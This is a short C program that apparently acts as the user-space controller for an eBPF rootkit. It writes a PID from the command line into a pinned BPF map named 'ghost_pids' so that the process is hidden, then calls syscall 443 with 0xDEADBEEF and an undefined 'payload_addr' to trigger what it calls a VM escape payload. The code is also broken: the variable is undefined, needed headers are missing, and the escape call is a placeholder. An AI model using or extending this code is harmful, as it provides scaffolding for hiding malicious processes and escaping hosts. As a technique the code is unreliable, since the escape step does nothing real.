#include <linux/bpf.h>
#include <bpf/bpf.h>

#define GHOST_MAP "/sys/fs/bpf/ghost_pids"

int main(int argc, char **argv) {
	int map_fd = bpf_obj_get(GHOST_MAP);
	u32 pid = atoi(argv[2]);
	
	// Add PID to hidden process list
	bpf_map_update_elem(map_fd, &pid, &pid, BPF_ANY);
	
	// Activate VM escape payload
	syscall(443, 0xDEADBEEF, payload_addr); 
}